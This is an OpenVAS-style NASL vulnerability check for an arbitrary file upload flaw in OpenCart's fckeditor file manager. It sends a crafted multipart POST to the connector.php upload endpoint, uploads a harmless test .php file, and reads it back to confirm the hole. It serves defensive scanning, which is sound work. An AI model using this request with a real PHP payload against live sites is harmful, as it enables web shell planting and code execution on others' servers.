CPE = "cpe:/a:opencart:opencart";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100816" );
	script_version( "$Revision: 13957 $" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-01 10:46:54 +0100 (Fri, 01 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2010-09-21 16:24:40 +0200 (Tue, 21 Sep 2010)" );
	script_bugtraq_id( 43325 );
	script_tag( name: "cvss_base", value: "4.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:S/C:P/I:P/A:P" );
	script_name( "OpenCart 'fckeditor' Arbitrary File Upload Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/43325" );
	script_xref( name: "URL", value: "http://www.opencart.com" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "opencart_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "OpenCart/installed" );
	script_tag( name: "summary", value: "OpenCart is prone to an arbitrary-file-upload vulnerability because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker may leverage this issue to upload arbitrary files to the
  affected host. This can result in arbitrary code execution within the context of the vulnerable application." );
	script_tag( name: "affected", value: "OpenCart versions up to 1.3.2 are vulnerable. Other versions may also be
affected." );
	script_tag( name: "solution", value: "Update OpenCart to version 1.3.3 or above. Make sure the directory
  /admin/view/javascript/fckeditor/ is deleted during the update." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
file = NASLString( "vt-upload-test-delete-me-", rand(), ".php" );
url = dir + "/admin/view/javascript/fckeditor/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2F";
useragent = http_get_user_agent();
host = http_host_name( port: port );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n", "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n", "Accept-Encoding: gzip,deflate\\r\\n", "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n", "Keep-Alive: 115\\r\\n", "Connection: keep-alive\\r\\n", "Referer: http://", get_host_name(), "/", dir, "//admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html\\r\\n", "Content-Type: multipart/form-data; boundary=---------------------------1179981022663023650735134601\\r\\n", "Content-Length: 275\\r\\n", "\\r\\n", "-----------------------------1179981022663023650735134601\\r\\n", "Content-Disposition: form-data; name='NewFile'; filename='", file, "'\\r\\n", "Content-Type: text/plain\\r\\n", "\\r\\n", "VT-Upload-Test\\r\\n", "\\r\\n", "-----------------------------1179981022663023650735134601--\\r\\n", "\\r\\n\\r\\n" );
recv = http_keepalive_send_recv( data: req, port: port, bodyonly: TRUE );
if(ContainsString( recv, "OnUploadCompleted" ) && ContainsString( recv, file )){
	url = dir + "/admin/view/javascript/fckeditor/editor/filemanager/connectors/php/" + file;
	req2 = http_get( item: url, port: port );
	recv = http_keepalive_send_recv( data: req2, port: port, bodyonly: TRUE );
	if(ContainsString( recv, "VT-Upload-Test" )){
		report = "It was possible to upload the file \"" + dir + file + "\". Please delete this file.";
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

